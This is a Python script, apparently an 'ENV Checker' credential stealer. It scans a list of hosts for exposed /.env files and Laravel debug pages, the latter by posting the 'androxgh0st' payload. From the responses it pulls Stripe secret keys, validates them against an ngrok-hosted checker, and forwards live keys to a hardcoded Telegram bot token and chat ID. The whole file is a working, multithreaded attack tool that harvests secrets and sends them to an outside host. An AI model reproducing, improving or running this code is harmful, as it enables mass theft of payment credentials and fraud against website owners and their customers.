import threading
import httpx
import time
import os
import re

def TelegramForwarder(sk):
	#Put your stuff here :D
	enabled=True
	bot_key="1729579481:AAHk8-Z05j4pm-lE36A-3NyZD7Xl2z8DyoQ"
	chat_id="-1001319085364"

	if enabled:
		httpx.post("https://api.telegram.org/bot"+bot_key+"/sendMessage?chat_id="+chat_id+"&text=✅ SK LIVE Key Found: sk_live_"+sk+" ✅\n\nCracked by ; @sharinganuser1")

os.system("cls")
ipiter = iter(open("combo.txt", 'r').read().splitlines())
count = 0
hits = 0
sklivehits = 0
sktesthits = 0
dhits = 0
duplicates=[]

def thread():
	global ipiter
	global count
	global hits
	global sktesthits
	global sklivehits
	global logs
	global duplicates
	global dhits
	while True:
		try:
			ip=next(ipiter)
			a=httpx.get("https://"+ip+"/.env", timeout=1.5, verify=False).text
			if "sk_live_" in a:
				hits += 1
				with open("output.txt", "a+", encoding='utf-8',) as h:
					h.write(ip+"\n"+a+"\n\n\n")
				for i in re.findall("sk_live_(.*)[\" \",'\"',\"\\n\", \"\\r\", \"<\"]", a):
					if "<" in i:
						i=i.split("<",1)[0]
					i=i.replace('"', "")
					if i not in duplicates and "LIVE" in httpx.get("https://mychecker.ngrok.dev/v2/skcheck.php?sk=sk_live_"+i+"&referrer=Uchiha").text:
						sklivehits += 1
						duplicates.append(i)
						TelegramForwarder(i)
						with open("hits.txt", "a+", encoding='utf-8',) as h:
							h.write("SK_LIVE Key: sk_live_"+i+"\n")
			elif "sk_test_" in a:
				hits += 1
				with open("output.txt", "a+", encoding='utf-8',) as h:
					h.write(ip+"\n"+a+"\n\n\n")
				for i in re.findall("sk_test_(.*)[\" \",'\"',\"\\n\", \"\\r\", \"<\"]", a):
					if "<" in i:
						i=i.split("<",1)[0]
					i=i.replace('"', "")
					if i not in duplicates and "LIVE" in httpx.get("https://mychecker.ngrok.dev/v2/skcheck.php?sk=sk_test_"+i+"&referrer=Uchiha").text:
						sktesthits += 1
						duplicates.append(i)
						with open("hits.txt", "a+", encoding='utf-8',) as h:
							h.write("SK_TEST Key: sk_test_"+i+"\n")
			else:
				a=httpx.post("https://"+ip, data={"0x[]":"androxgh0st"}, timeout=1.5, verify=False).text
				if "sk_live_" in a:
					with open("dip.txt", "a+", encoding='utf-8',) as h:
						h.write(ip+"\n"+a+"\n\n\n")
					dhits += 1
					for i in re.findall("sk_live_(.*)[\" \",'\"',\"\\n\", \"\\r\", \"<\"]", a):
						if "<" in i:
							i=i.split("<",1)[0]
						i=i.replace('"', "")
						if i not in duplicates and "LIVE" in httpx.get("https://mychecker.ngrok.dev/v2/skcheck.php?sk=sk_live_"+i+"&referrer=Uchiha").text:
							sklivehits += 1
							duplicates.append(i)
							TelegramForwarder(i)
							with open("hits.txt", "a+", encoding='utf-8',) as h:
								h.write("SK_LIVE Key: sk_live_"+i+"\n")
				elif "sk_test_" in a:
					with open("dip.txt", "a+", encoding='utf-8',) as h:
						h.write(ip+"\n"+a+"\n\n\n")
					dhits += 1
					for i in re.findall("sk_test_(.*)[\" \",'\"',\"\\n\", \"\\r\", \"<\"]", a):
						if "<" in i:
							i=i.split("<",1)[0]
						i=i.replace('"', "")
						if i not in duplicates and "LIVE" in httpx.get("https://mychecker.ngrok.dev/v2/skcheck.php?sk=sk_test_"+i+"&referrer=Uchiha").text:
							sktesthits += 1
							duplicates.append(i)
							with open("hits.txt", "a+", encoding='utf-8',) as h:
								h.write("SK_TEST Key: sk_test_"+i+"\n")
			count += 1
		except StopIteration:
			break
		except:
			pass

for i in range(150):
	threading.Thread(target=thread).start()

os.system("title ENV Checker ^| v0.3b")

while True:
	os.system("cls")
	print("Checked: "+str(count))
	print("ENV Hits: "+str(hits))
	print("DEBUG Hits: "+str(dhits))
	print("SK_TEST Hits: "+str(sktesthits))
	print("SK_LIVE Hits: "+str(sklivehits))
	time.sleep(0.25)